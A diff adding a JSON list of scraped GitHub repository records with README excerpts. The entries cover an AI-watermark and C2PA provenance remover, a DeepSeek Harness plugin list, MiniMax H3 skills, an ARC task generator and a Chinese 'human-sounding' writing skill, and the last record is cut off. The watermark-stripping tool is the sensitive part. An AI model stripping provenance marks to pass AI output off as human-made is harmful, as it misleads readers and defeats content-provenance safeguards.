@@ -1,0 +1,875 @@
+[
+  {
+    "basic_info": {
+      "name": "watermarks-remover",
+      "full_name": "guillaumemeyer/watermarks-remover",
+      "owner": "guillaumemeyer",
+      "description": "Strip multi-vendor AI provenance marks: Unicode text hygiene, statistical rewrite hooks, and C2PA/metadata from PNG/JPEG/SVG/PDF/DOCX/HTML/MD",
+      "url": "https://github.com/guillaumemeyer/watermarks-remover",
+      "clone_url": "https://github.com/guillaumemeyer/watermarks-remover.git",
+      "ssh_url": "git@github.com:guillaumemeyer/watermarks-remover.git",
+      "homepage": "https://github.com/guillaumemeyer/watermarks-remover",
+      "created_at": "2026-08-11T16:32:38Z",
+      "updated_at": "2026-08-23T02:13:35Z",
+      "pushed_at": "2026-08-23T00:36:36Z"
+    },
+    "stats": {
+      "stars": 17066,
+      "forks": 1957,
+      "watchers": 17066,
+      "open_issues": 33,
+      "size": 919
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 921190,
+        "Shell": 19379,
+        "PowerShell": 15280,
+        "Makefile": 4652,
+        "Dockerfile": 2886
+      },
+      "license": "MIT License",
+      "topics": [
+        "agent-skill",
+        "ai",
+        "anthropic",
+        "c2pa",
+        "chatgpt",
+        "claude",
+        "gemini",
+        "openai",
+        "provenance",
+        "synthid",
+        "watermark",
+        "watermark-detection",
+        "watermark-tools",
+        "watermarking",
+        "watermarks"
+      ]
+    },
+    "content": {
+      "readme": "```\n_ _ _ ____ ___ ____ ____ _  _ ____ ____ _  _ ____    ____ ____ _  _ ____ _  _ ____ ____\n| | | |__|  |  |___ |__/ |\\/| |__| |__/ |_/  [__  __ |__/ |___ |\\/| |  | |  | |___ |__/\n|_|_| |  |  |  |___ |  \\ |  | |  | |  \\ | \\_ ___]    |  \\ |___ |  | |__|  \\/  |___ |  \\\n```\n\n# watermarks-remover\n\n<!-- logo: figlet -d .figlet -f cybermedium -w 120 \"watermarks-remover\" -->\n\n[![CI](https://github.com/guillaumemeyer/watermarks-remover/actions/workflows/ci.yml/badge.svg)](https://github.com/guillaumemeyer/watermarks-remover/actions/workflows/ci.yml)\n[![Release](https://img.shields.io/github/v/release/guillaumemeyer/watermarks-remover)](https://github.com/guillaumemeyer/watermarks-remover/releases)\n[![Stars](https://img.shields.io/github/stars/guillaumemeyer/watermarks-remover)](https://github.com/guillaumemeyer/watermarks-remover/stargazers)\n[![Forks](https://img.shields.io/github/forks/guillaumemeyer/watermarks-remover)](https://github.com/guillaumemeyer/watermarks-remover/forks)\n\nAgent skill + stdlib Python service to strip **multi-vendor AI provenance marks** from text and files — for privacy and hygiene on content **you own**. The skill is a thin client: it drives the machinery over HTTP, so the agent host needs no Python.\n\n| Layer | Target | How |\n| --- | --- | --- |\n| **A** | Invisible Unicode, exotic spaces, bidi, tag chars | Deterministic Python scripts |\n| **B** | Statistical (token-sampling) text watermarks | Agent rewrite + optional `rewrite_text.py` hook |\n| **Files** | C2PA / EXIF / XMP / doc props | PNG, JPEG, WebP, AVIF, HEIC, BMP, GIF, TIFF, SVG, PDF, DOCX, XLSX, PPTX, EPUB, ODT, HTML, Markdown, MP4/MOV/M4A/M4V, WAV, MP3 |\n\nVendors / ecosystems (class-level): **Claude**, **Gemini / SynthID-Text**, **OpenAI** provenance surfaces, **open-LLM** Kirchenbauer-style (green-list) and keyed-Gumbel / EXP (Aaronson) marks.\n\n**Latest release:** [v0.5.0](https://github.com/guillaumemeyer/watermarks-remover/releases/tag/v0.5.0)\n\nSkill path: [`skills/remove-ai-marks/`](skills/remove-ai-marks/)  \nService path: [`service/`](service/)  \n(migration: formerly `remove-claude-marks`; slash alias `/remove-claude-marks` still documented)\n\n## Install (agent skill)\n\nThe skill ships **no code** — it calls the service over HTTP. Install the skill (markdown only) and start the service, then set `WATERMARKS_SERVICE_URL` if it is not `http://127.0.0.1:8765`.\n\n```bash\n# Grok Build / project-local\nmkdir -p .grok/skills\nln -sfn \"$(pwd)/skills/remove-ai-marks\" .grok/skills/remove-ai-marks\n\n# User-global Grok\nmkdir -p ~/.grok/skills\nln -sfn \"$(pwd)/skills/remove-ai-marks\" ~/.grok/skills/remove-ai-marks\n```\n\nInvoke with `/remove-ai-marks` or ask to “strip AI watermarks / C2PA / Claude marks / SynthID-class text.”\n\n### Optional Cursor text-only skill\n\n[`skills/clean-user-facing-text/`](skills/clean-user-facing-text/) is a\nself-contained Cursor skill for authorized manuscripts, documentation, and web\ncopy. It excludes image, C2PA, service, and external-model tooling.\n\nInstall it into `~/.cursor/skills/clean-user-facing-text`:\n\n```bash\npython3 install_skill.py\n```\n\nOn Windows, use `py install_skill.py`. The `install-skill.sh` wrapper is\nprovided for macOS/Linux shells. Existing installations are preserved unless\nyou pass `--force`; replacement is staged first and the previous install is\nkept as a uniquely named backup.\n\nSkill invocation is model-selected. Projects that explicitly adopt this\nworkflow can also copy the optional rule:\n\n```bash\nmkdir -p /path/to/project/.cursor/rules\ncp integrations/cursor/clean-user-facing-text.mdc \\\n  /path/to/project/.cursor/rules/clean-user-facing-text.mdc\n```\n\nFor all projects, put the same instruction in Cursor **User Rules** instead.\nRules improve consistency but remain model instructions; Cursor does not expose\na deterministic pre-send filter for final chat responses.\n\n### Start the service\n\nThe fastest path is a local HTTP server (Python 3.10+ stdlib only — no deps, no Docker):\n\n```bash\nmake serve                 # http://127.0.0.1:8765\n# or directly:\npython3 service/scripts/server.py --host 127.0.0.1 --port 8765\n```\n\n### Windows (no Docker)\n\nSee [docs/windows-autostart.md](docs/windows-autostart.md) for auto-starting the service at Windows login without Docker.\n\nFor the whole infra (core + optional harness/heavy backends), see [Docker / compose](#docker--compose) below.\n\nOptional system tools (auto-used when present — preinstalled in the core Docker image):\n\n| Tool | Role |\n| --- | --- |\n| [`c2patool`](https://github.com/contentauth/c2pa-rs/tree/main/cli) | Inspect C2PA manifests |\n| [`exiftool`](https://exiftool.org/) | Residual metadata strip (esp. **PDF**) |\n| [`qpdf`](https://qpdf.sourceforge.io/) | Structural PDF rebuild — **required** for a real PDF strip (see below) |\n\nCore scripts need **Python 3.10+** stdlib only. Layer B model calls are optional.\n\n## Quick use (scripts)\n\n```bash\nSCRIPTS=service/scripts\n\n# Unified inspect / clean\npython3 \"$SCRIPTS/inspect_file.py\" draft.md\npython3 \"$SCRIPT",
+      "default_branch": "main"
+    },
+    "fetched_at": "2026-08-23T02:19:13.677572"
+  },
+  {
+    "basic_info": {
+      "name": "awesome-dsh-plugin",
+      "full_name": "awesome-dsh-plugin/awesome-dsh-plugin",
+      "owner": "awesome-dsh-plugin",
+      "description": "A curated list of plugins for DeepSeek Harness (dsh) · DeepSeek Harness 插件精选列表",
+      "url": "https://github.com/awesome-dsh-plugin/awesome-dsh-plugin",
+      "clone_url": "https://github.com/awesome-dsh-plugin/awesome-dsh-plugin.git",
+      "ssh_url": "git@github.com:awesome-dsh-plugin/awesome-dsh-plugin.git",
+      "homepage": "https://awesome-dsh-plugin.com",
+      "created_at": "2026-08-13T13:55:31Z",
+      "updated_at": "2026-08-23T02:17:56Z",
+      "pushed_at": "2026-08-22T16:38:41Z"
+    },
+    "stats": {
+      "stars": 11545,
+      "forks": 1793,
+      "watchers": 11545,
+      "open_issues": 375,
+      "size": 62554
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 290595,
+        "JavaScript": 152971,
+        "HTML": 86720,
+        "Shell": 12624
+      },
+      "license": "Creative Commons Zero v1.0 Universal",
+      "topics": [
+        "awesome",
+        "awesome-list",
+        "deepseek-harness",
+        "dsh",
+        "dsh-plugin"
+      ]
+    },
+    "content": {
+      "readme": "# Awesome DeepSeek Harness (DSH) Plugin [![Awesome](https://awesome.re/badge.svg)](https://awesome.re) ![awesome · DSH plugin](https://awesome-dsh-plugin.com/badge.svg) ![plugin count](https://img.shields.io/endpoint?url=https%3A%2F%2Fawesome-dsh-plugin.com%2Fcount.json)\n\n[![Awesome DSH Plugin](https://awesome-dsh-plugin.com/banner-en.png)](https://awesome-dsh-plugin.com)\n\nEnglish | [中文](README.zh.md)\n\n> A curated list of plugins for [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) (`dsh`).\n\nDeepSeek Harness is DeepSeek's open-source agent harness — a runnable coding agent (Web and headless), built on a framework where everything is a plugin: models, tools, sandboxes, session storage, UI, even the agent loop itself. Plugins can extend the official coding agent, swap out its core parts, or assemble something entirely different.\n\nThis list collects community plugins that are installable via `dsh plugin add` (each declares a `dsh.bundle` manifest). [PRs welcome](#contributing).\n\n> 🛒 **Recommended: [dsh-market](https://github.com/dsh-market/dsh-market#readme)** (optional) — the plugin market inside DeepSeek Harness, with every plugin on this list. Simple, friendly UI: one-click plugin install and upgrade, one-click theme switching:\n\n```sh\ndsh plugin --profile web add dshmarket\n```\n\n<a href=\"https://raw.githubusercontent.com/dsh-market/dsh-market/main/assets/demo-en.png\"><img src=\"https://raw.githubusercontent.com/dsh-market/dsh-market/main/assets/demo-en.png\" width=\"320\" alt=\"dsh-market plugin browser inside DeepSeek Harness Settings: searchable plugin cards with one-click Install, category filters and a Themes tab\"></a>\n\n<sub><i>The plugin market inside Settings — click to enlarge.</i></sub>\n\n> 💡 Prefer chat? [dsh-find-plugin](https://github.com/awesome-dsh-plugin/dsh-find-plugin#readme) lets your agent find plugins for you (`dsh plugin --profile web add dsh-find-plugin`).\n\n> ℹ️ **On desktop clients.** This list is client-agnostic. A plugin is listed because it follows the official protocol — it declares a `dsh.bundle` manifest and installs with `dsh plugin add` — not because it adapts to any particular client.\n>\n> We're talking with `anywhere-labs/deepseek-harness-desktop` about working together again; we'll update this note as that progresses. Whatever comes of it, the listing rule stays as it is: adapting to any particular client is not a condition of being listed, and no plugin will be removed or demoted for not doing so.\n>\n> Clients worth a look: [dsh-desktop](https://github.com/dataelement/dsh-desktop) and [deepseek-harness-desktop](https://github.com/hairyf/deepseek-harness-desktop) — both ship dsh-market built in, so everything on this list is one click away. Any other good third-party client works too.\n\n> [!WARNING]\n> Installing a plugin runs third-party code on your machine with your own permissions — it can read your files, use your credentials, and reach the network. Tool approvals don't sandbox plugin code. Being on this list is not a security review: check the source before you install, and try unfamiliar plugins somewhere that doesn't hold your keys. See the full disclaimer at the bottom of this page.\n\n<details>\n<summary><b>What it takes to be listed here</b></summary>\n\nAn entry is added when the plugin installs with `dsh plugin add`, does what its one-line description says, sits in the right category, and is maintained. Every submission is checked against its own source before merging — if a description claims \"46 tools\", someone counts them.\n\nThat is the whole bar. **This list doesn't rank plugins or judge their quality, and we don't want to.** Plenty of good software will never appear here, and a slot here proves nothing beyond meeting those rules. They exist so that whatever you pick installs and behaves the way the line said it would.\n\nA listing isn't permanent either: entries whose repos go away, stop being maintained, or turn out to be broken get removed. Full criteria and the review checklist: [how submissions are reviewed](contributing.md#how-submissions-are-reviewed--收录如何评审).\n\n</details>\n\n## Contents\n\n<!-- BEGIN TOC -->\n- [Plugins](#plugins)\n  - [UI Enhancements](#ui-enhancements)\n  - [Usage & Billing](#usage--billing)\n  - [Themes & Appearance](#themes--appearance)\n  - [Models & Providers](#models--providers)\n  - [Identity & Communication](#identity--communication)\n  - [Sessions & Messages](#sessions--messages)\n  - [Memory](#memory)\n  - [Tools & Capabilities](#tools--capabilities)\n  - [Browser & Web](#browser--web)\n  - [Vision & Multimodal](#vision--multimodal)\n  - [Voice & Audio](#voice--audio)\n  - [Docs & Rendering](#docs--rendering)\n  - [Skills](#skills)\n  - [Workflow & Automation](#workflow--automation)\n  - [Git & Code Review](#git--code-review)\n  - [Notifications & Integrations](#notifications--integrations)\n  - [Development & Runtime](#development--runtime)\n  - [Security & Permissions](#security--permissions)\n  - [Remote & Mobile](#remote--mobile)\n  - [Plugin M",
+      "default_branch": "main"
+    },
+    "fetched_at": "2026-08-23T02:19:15.042552"
+  },
+  {
+    "basic_info": {
+      "name": "MiniMax-H3",
+      "full_name": "MiniMax-AI/MiniMax-H3",
+      "owner": "MiniMax-AI",
+      "description": null,
+      "url": "https://github.com/MiniMax-AI/MiniMax-H3",
+      "clone_url": "https://github.com/MiniMax-AI/MiniMax-H3.git",
+      "ssh_url": "git@github.com:MiniMax-AI/MiniMax-H3.git",
+      "homepage": null,
+      "created_at": "2026-07-30T08:41:09Z",
+      "updated_at": "2026-08-23T02:14:13Z",
+      "pushed_at": "2026-08-15T08:31:17Z"
+    },
+    "stats": {
+      "stars": 6731,
+      "forks": 419,
+      "watchers": 6731,
+      "open_issues": 20,
+      "size": 93146
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 349286,
+        "Shell": 35067
+      },
+      "license": null,
+      "topics": []
+    },
+    "content": {
+      "readme": "<div align=\"center\">\n  <img width=\"100%\" src=\"assets/minimax-h3-header.gif\" alt=\"MiniMax H3\">\n</div>\n\n<p align=\"center\">\n  <a href=\"https://hailuoai.video\" target=\"_blank\"><img src=\"https://img.shields.io/badge/Hailuo%20AI-FF6C37?logo=minimax&logoColor=white\" alt=\"Hailuo AI\"></a>\n  <a href=\"https://platform.minimax.io/docs/guides/text-generation\" target=\"_blank\"><img src=\"https://img.shields.io/badge/API-FF6C37?logo=minimax&logoColor=white\" alt=\"API\"></a>\n  <a href=\"https://www.minimax.io\" target=\"_blank\"><img src=\"https://img.shields.io/badge/MiniMax%20Website-FF6C37?logo=minimax&logoColor=white\" alt=\"MiniMax Website\"></a>\n  <a href=\"https://github.com/MiniMax-AI/MiniMax-H3\" target=\"_blank\"><img src=\"https://img.shields.io/badge/GitHub-181717?logo=github&logoColor=white\" alt=\"GitHub\"></a>\n  <a href=\"https://huggingface.co/MiniMaxAI/MiniMax-H3\" target=\"_blank\"><img src=\"https://img.shields.io/badge/Hugging%20Face-FFD21E?logo=huggingface&logoColor=black\" alt=\"Hugging Face\"></a>\n  <br>\n  <a href=\"https://modelscope.cn/organization/minimax\" target=\"_blank\" rel=\"noopener noreferrer\"><img alt=\"ModelScope MiniMax AI\" src=\"https://img.shields.io/badge/ModelScope-MiniMax%20AI-white?labelColor=%23EF3D5D\"></a>\n  <a href=\"https://platform.minimaxi.com/docs/faq/contact-us\" target=\"_blank\"><img src=\"https://img.shields.io/badge/WeChat-07C160?logo=wechat&logoColor=white\" alt=\"WeChat\"></a>\n  <a href=\"https://discord.com/invite/dbMxutw7tP\" target=\"_blank\"><img src=\"https://img.shields.io/badge/Discord-5865F2?logo=discord&logoColor=white\" alt=\"Discord\"></a>\n  <a href=\"https://huggingface.co/MiniMaxAI/MiniMax-H3/blob/main/LICENSE\"><img src=\"https://img.shields.io/badge/LICENSE-4CAF50?logo=creativecommons&logoColor=white\" alt=\"LICENSE\"></a>\n</p>\n\n<p align=\"center\">\n  <a href=\"README.md\"><strong>English</strong></a> |\n  <a href=\"README.zh-CN.md\">简体中文</a> |\n  <a href=\"README.ko.md\">한국어</a> |\n  <a href=\"README.ja.md\">日本語</a>\n</p>\n\n# MiniMax H3\n\n## Prompt Writing Skill\n\nInstall the H3 prompt writing skill — one of nine skills bundled with this repository:\n\n```bash\nnpx skills add https://github.com/MiniMax-AI/MiniMax-H3 --skill h3-prompt-writing\n```\n\nIt ships with two prompt guides under `skills/h3-prompt-writing/references/`: `base-en.txt` for text/keyframe modes and `ref-en.txt` for full-reference (Ref2VA) mode.\n\n**Agent compatibility:** `h3-prompt-writing` is a plain Markdown + reference-file skill with no external API calls, so it works in Claude Code, the Claude Agent SDK, Cursor, Windsurf, OpenAI-based agents/Codex, LangChain, or any other harness that can read a `SKILL.md` and local files. The bundled `skills/h3-prompt-writing/agents/openai.yaml` only adds optional UI metadata (display name, description, default prompt) for the ChatGPT/Codex skills UI, per [OpenAI's skill spec](https://learn.chatgpt.com/docs/build-skills) — it does not limit the skill to OpenAI agents.\n\nThe remaining eight are style-specific video generation skills built for the MiniMax Hub's canvas workflow (`hub_generate_video`, `hub_generate_image`, canvas nodes, choice cards, etc.) and are not portable to generic agent harnesses:\n\n<table align=\"center\">\n  <tr>\n    <td align=\"center\"><img src=\"assets/minimalist-product-ad-generator.gif\" alt=\"minimalist-product-ad-generator\" width=\"240\"><br><a href=\"skills/minimalist-product-ad-generator/SKILL.md\">minimalist-product-ad-generator</a></td>\n    <td align=\"center\"><img src=\"assets/3d-animation-short-generator.gif\" alt=\"3d-animation-short-generator\" width=\"240\"><br><a href=\"skills/3d-animation-short-generator/SKILL.md\">3d-animation-short-generator</a></td>\n    <td align=\"center\"><img src=\"assets/papercraft-stop-motion-explainer.gif\" alt=\"papercraft-stop-motion-explainer\" width=\"240\"><br><a href=\"skills/papercraft-stop-motion-explainer/SKILL.md\">papercraft-stop-motion-explainer</a></td>\n    <td align=\"center\"><img src=\"assets/brand-promo-video-generator.gif\" alt=\"brand-promo-video-generator\" width=\"240\"><br><a href=\"skills/brand-promo-video-generator/SKILL.md\">brand-promo-video-generator</a></td>\n  </tr>\n  <tr>\n    <td align=\"center\"><img src=\"assets/music-video-subtitle-generator.gif\" alt=\"music-video-subtitle-generator\"          width=\"240\"><br><a href=\"skills/music-video-subtitle-generator/SKILL.md\">music-video-subtitle-generator</a></td>\n    <td align=\"center\"><img src=\"assets/co-op-game-intro-generator.gif\" alt=\"co-op-game-intro-generator\" width=\"240\"><br><a href=\"skills/co-op-game-intro-generator/SKILL.md\">co-op-game-intro-generator</a></td>\n    <td align=\"center\"><img src=\"assets/paper-collage-explainer-generator.gif\" alt=\"paper-collage-explainer-generator\" width=\"240\"><br><a href=\"skills/paper-collage-explainer-generator/SKILL.md\">paper-collage-explainer-generator</a></td>\n    <td align=\"center\"><img src=\"assets/handdrawn-live-video-generator.gif\" alt=\"handdrawn-live-video-generator\" width=\"240\"><br><a href=\"skills/handdrawn-live-video-generator/SKILL.md\">handdrawn-live-video-generator</a></td>\n  </tr>\n",
+      "default_branch": "main"
+    },
+    "fetched_at": "2026-08-23T02:19:16.342082"
+  },
+  {
+    "basic_info": {
+      "name": "arc-task-gen",
+      "full_name": "pathwaycom/arc-task-gen",
+      "owner": "pathwaycom",
+      "description": "Generates original ARC-AGI-1-style tasks distribution-matched to the public eval set.",
+      "url": "https://github.com/pathwaycom/arc-task-gen",
+      "clone_url": "https://github.com/pathwaycom/arc-task-gen.git",
+      "ssh_url": "git@github.com:pathwaycom/arc-task-gen.git",
+      "homepage": null,
+      "created_at": "2026-08-04T12:59:02Z",
+      "updated_at": "2026-08-23T02:18:04Z",
+      "pushed_at": "2026-08-11T09:52:10Z"
+    },
+    "stats": {
+      "stars": 4551,
+      "forks": 26,
+      "watchers": 4551,
+      "open_issues": 1,
+      "size": 643
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 82363
+      },
+      "license": "MIT License",
+      "topics": []
+    },
+    "content": {
+      "readme": "# ARC-AGI-1 Task Generator\n\n## Distribution-Matched Tasks for Model Evaluation\n\nThis repository generates fresh ARC-AGI-1-style tasks that resemble the public dataset. These tasks can be used to evaluate frontier models such as BDH-CQ on problems they are unlikely to have encountered before.\n\n<!-- TODO: Add the BDH-CQ arXiv link when available. -->\n\n## Overview\n\nBDH-CQ is a reasoning model that combines in-context learning through evolving recurrent memory with iterative reasoning in a structured, continuous latent space.\n\nIt builds on Dragon Hatchling (BDH), a post-Transformer recurrent architecture in which neuron-like units communicate through low-rank interactions and maintain context in an evolving associative state. BDH-CQ extends this architecture: at inference time, its recurrent memory is continuously updated, and queries are solved through iterative computation in latent space rather than by generating an intermediate, text-based chain of thought.\n\nWe evaluate BDH-CQ on the public ARC-AGI-1 evaluation set and use controlled ARC-like interventions to study what the model learns from demonstrations.\n\nA 150M-parameter configuration achieves **29.5% pass@2** on the public ARC-AGI-1 evaluation set at a computed inference cost of **$0.0007 per task**. This is 11× cheaper per task than GPT-5.6 Luna (Low), following an 80% price reduction on July 30.\n\nThe architecture has also been tested in pretraining experiments ranging from 1B to 600B parameters, demonstrating Transformer-like scaling while retaining BDH-CQ's recurrent latent-reasoning capabilities.\n\n## Paper and Blog Post\n\nThis repository accompanies the following paper:\n\n> B. Engdahl, A. Kosowski, J. Chorowski, Z. Stamirowska, P. Uznański, J. Jiang, R. Phadke, R. Kinas, and R. Zhong. [*BDH-CQ: Introducing In-Context Learning with Recurrent Latent Reasoning*](https://arxiv.org/abs/2608.09888).\n\n<!-- TODO: Replace the temporary paper link above with the arXiv URL when available. -->\n\nFor a broader introduction and discussion, read the [accompanying blog post](https://pathway.com/blog/pathway-150m-model-breaks-arc-agi-1-cost-efficiency-frontier).\n\n## ARC-AGI-1 Efficiency Frontier\n\n![Pathway ARC-AGI efficiency chart](assets/Pathway_ARC-AGI_result_chart.png)\n\n## What You'll Find in This Repository\n\nAs a public benchmark, ARC-AGI-1 cannot fully isolate few-shot rule induction from potential prior familiarity with its tasks.\n\nTo provide a complementary measure, `arc-task-gen` creates a private evaluation set with similar properties, enabling meaningful comparisons between public-benchmark performance and performance on newly generated tasks.\n\nThe generated `tasks.json` file follows the standard ARC format:\n\n```json\n{\n  \"train\": [],\n  \"test\": []\n}\n```\n\nIt is compatible with existing ARC evaluation harnesses.\n\nFollow the instructions in [`instructions.md`](instructions.md) to start generating tasks.\n\n## Independent Reproduction\n\nBDH-CQ's ARC-AGI-1 results were evaluated and reproduced by Łukasz Kaiser, a co-author of the Transformer architecture and TensorFlow.\n\nThe results were also independently reproduced by Remigiusz Kinas, a contributor to Bielik, and Richard Zhong, an NYU researcher. Their work focused on model evaluation and benchmark robustness.\n",
+      "default_branch": "main"
+    },
+    "fetched_at": "2026-08-23T02:19:17.703276"
+  },
+  {
+    "basic_info": {
+      "name": "human-writing",
+      "full_name": "KKKKhazix/human-writing",
+      "owner": "KKKKhazix",
+      "description": "让 AI 写的中文读起来像一个具体的人在说话。通用创作与改稿 Skill，开箱即用。",
+      "url": "https://github.com/KKKKhazix/human-writing",
+      "clone_url": "https://github.com/KKKKhazix/human-writing.git",
+      "ssh_url": "git@github.com:KKKKhazix/human-writing.git",
+      "homepage": null,
+      "created_at": "2026-08-05T01:19:41Z",
+      "updated_at": "2026-08-23T00:19:04Z",
+      "pushed_at": "2026-08-11T15:07:45Z"
+    },
+    "stats": {
+      "stars": 2973,
+      "forks": 240,
+      "watchers": 2973,
+      "open_issues": 7,
+      "size": 481
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 21598
+      },
+      "license": "MIT License",
+      "topics": [
+        "agent-skills",
+        "chinese-writing",
+        "creative-writing",
+        "writing-skill"
+      ]
+    },
+    "content": {
+      "readme": "<p align=\"center\">\n  <img src=\"./assets/readme-cover.svg\" alt=\"活人感写作\" width=\"100%\">\n</p>\n\n<p align=\"center\">\n  <a href=\"https://github.com/KKKKhazix/human-writing/releases/tag/v1.1.0\"><img alt=\"Version 1.1.0\" src=\"https://img.shields.io/badge/version-1.1.0-C4473A?style=flat-square\"></a>\n  <a href=\"./LICENSE\"><img alt=\"MIT License\" src=\"https://img.shields.io/badge/license-MIT-313131?style=flat-square\"></a>\n  <a href=\"https://github.com/KKKKhazix/human-writing/releases/latest\"><img alt=\"GitHub Release\" src=\"https://img.shields.io/github/v/release/KKKKhazix/human-writing?style=flat-square&color=6B6258\"></a>\n</p>\n\n<p align=\"center\">\n  <a href=\"#快速安装\">快速安装</a> ·\n  <a href=\"#它做什么\">写作流程</a> ·\n  <a href=\"#仓库结构\">仓库结构</a> ·\n  <a href=\"https://github.com/KKKKhazix/human-writing/issues\">提交问题</a>\n</p>\n\n> AI 写中文有个通病：读完觉得挺流畅，但说不出是谁写的。活人感写作想治的就是这件事。\n\n让模型写出来的文章读起来像一个具体的人在说话——知道一些事，有判断，偶尔岔开一句，还能接回来。适用于知乎回答、公众号文章、博客、论坛帖、人物故事、科普、评测、小说、口播等大多数中文写作场景。\n\n## 它做什么\n\n写作之前先解决一个前置问题：你手上有没有东西可写。\n\n现实题材，材料不够就去查，查不到就追问或者缩短篇幅，绝不拿车轱辘话凑字数。虚构题材可以自由创造人物和情节，但每个场景仍然要有目标、有动作、有变化。\n\n材料过关之后管三件事：\n\n| 材料 | 推进 | 中文 |\n| :--- | :--- | :--- |\n| 现实写作核准事实、数字、引语和亲历。虚构写作检查人物、行动与因果。 | 每段都要带来新东西——新事实、新动作、新例子或新后果。写过的不重复。 | 白话打底，在意词序和停顿，清掉报告腔、模型腔和翻案句。 |\n\n初稿写完还有一道关。Skill 会逐段检查有没有在原地转圈，砍掉重复解释，调整长短句节奏，拦住冒号滥用、破折号、「不是……而是……」之类的翻案腔和常见 AI 黑话。检查脚本只管已经写明的硬规则，不替你决定风格。\n\n## 快速安装\n\n把下面这句话发给你的 Agent。\n\n```bash\n帮我安装这个skill：https://github.com/KKKKhazix/human-writing\n```\n\nAgent 会读取仓库、找到 `human-writing`，完成安装。装好之后显示名为「活人感写作」。\n\n<details>\n<summary><strong>Agent 不支持直接安装时</strong></summary>\n\n从 [Releases](https://github.com/KKKKhazix/human-writing/releases/latest) 下载，或者把仓库里的 [`human-writing`](./human-writing) 文件夹完整复制到本机 Skills 目录。文件夹名保留 `human-writing`。\n\n```text\n~/.agents/skills/human-writing/\n```\n\n</details>\n\n装好之后这样用：\n\n```text\n使用 $human-writing，把我的材料写成一篇有活人感和中文韵律的作品。\n```\n\n## 1.1.0 改了什么\n\n1.0 用字符串禁令拦 AI 味——禁「不是……而是……」、禁冒号、禁一批黑话。有效，但模型会换一套字面继续做同样的事。「你以为……其实……」「回头才发现」和「不是A而是B」是同一个姿势，读者认的是姿势，不是字。\n\n1.1 把防线从字面挪到动作：禁的是「先给读者立一个他没有的误解，再推翻它」这件事本身，不管穿什么外衣。检测脚本也跟着升级，补了变形翻案句、AI 排比、抒情借喻的警告层，加了句长变异系数和连词密度的统计检查，同时把「不丢人」「打法」这类正常中文从误伤名单里捞出来。另外出了一个两千字的蒸馏版，ChatGPT、千问这类聊天窗口直接粘贴就能用。\n\n完整变更见 [CHANGELOG.md](./CHANGELOG.md)。\n\n## 仓库结构\n\n<details>\n<summary><strong>展开查看完整目录</strong></summary>\n\n```text\nhuman-writing/\n├── SKILL.md\n├── VERSION\n├── LICENSE\n├── agents/\n│   └── openai.yaml\n├── dist/\n│   └── human-writing-lite.md\n├── references/\n│   ├── forum-prose.md\n│   ├── reality.md\n│   ├── fiction.md\n│   ├── formats.md\n│   └── revision.md\n└── scripts/\n    └── check_prose.py\n```\n\n| 位置 | 干什么的 |\n| :--- | :--- |\n| [`SKILL.md`](./human-writing/SKILL.md) | 入口。材料门槛、现实与虚构分流、写作流程、交付禁令，全在这一份里 |\n| [`forum-prose.md`](./human-writing/references/forum-prose.md) | 知乎、公众号、论坛长帖的写法，节奏和措辞的具体做法都在这里 |\n| [`reality.md`](./human-writing/references/reality.md) | 真人、历史、新闻、数据和个人经历的事实边界 |\n| [`fiction.md`](./human-writing/references/fiction.md) | 小说、故事、虚构散文和对白的创作规则 |\n| [`formats.md`](./human-writing/references/formats.md) | 短内容、口播、演讲、教程、评测等特殊形式 |\n| [`revision.md`](./human-writing/references/revision.md) | 初稿写完之后怎么改——逐遍检查清单 |\n| [`check_prose.py`](./human-writing/scripts/check_prose.py) | 检查成稿有没有踩到硬禁令 |\n| [`human-writing-lite.md`](./human-writing/dist/human-writing-lite.md) | 蒸馏版，两千字以内，聊天窗口直接粘贴用 |\n\n</details>\n\n## 反馈\n\nMIT 协议开源。仓库只有原创规则和工具，没有第三方文章、训练语料或模型权重。\n\n碰到规则冲突、误报或者某个模型上表现不对，欢迎[提 Issue](https://github.com/KKKKhazix/human-writing/issues)。附上你的提示词、模型输出片段和你觉得应该是什么样，排查起来快很多。\n\n<p align=\"center\">\n  <sub>活人感写作 · Human Writing · 1.1.0</sub>\n</p>\n",
+      "default_branch": "main"
+    },
+    "fetched_at": "2026-08-23T02:19:19.014758"
+  },
+  {
+    "basic_info": {
+      "name": "srt-whiteboard-animation",
+      "full_name": "geeklee/srt-whiteboard-animation",
+      "owner": "geeklee",
+      "description": "将 SRT 字幕做成暖米黄纸张底的流式笔迹白板手绘动画 skill：mask 分区遮罩编排 + stream 连续笔迹（ink→color）。",
+      "url": "https://github.com/geeklee/srt-whiteboard-animation",
+      "clone_url": "https://github.com/geeklee/srt-whiteboard-animation.git",
+      "ssh_url": "git@github.com:geeklee/srt-whiteboard-animation.git",
+      "homepage": null,
+      "created_at": "2026-07-27T16:22:49Z",
+      "updated_at": "2026-08-23T02:04:17Z",
+      "pushed_at": "2026-07-27T16:24:52Z"
+    },
+    "stats": {
+      "stars": 2170,
+      "forks": 330,
+      "watchers": 2170,
+      "open_issues": 3,
+      "size": 12316
+    },
+    "tech_info": {
+      "language": "Python",
+      "languages": {
+        "Python": 116466,
+        "HTML": 28411
+      },
+      "license": "MIT License",
+      "topics": [
+        "ai-skill",
+        "hand-drawn",
+        "opencv",
+        "python",
+        "srt",
+        "subtitle",
+        "whiteboard-animation"
+      ]
+    },
+    "content": {
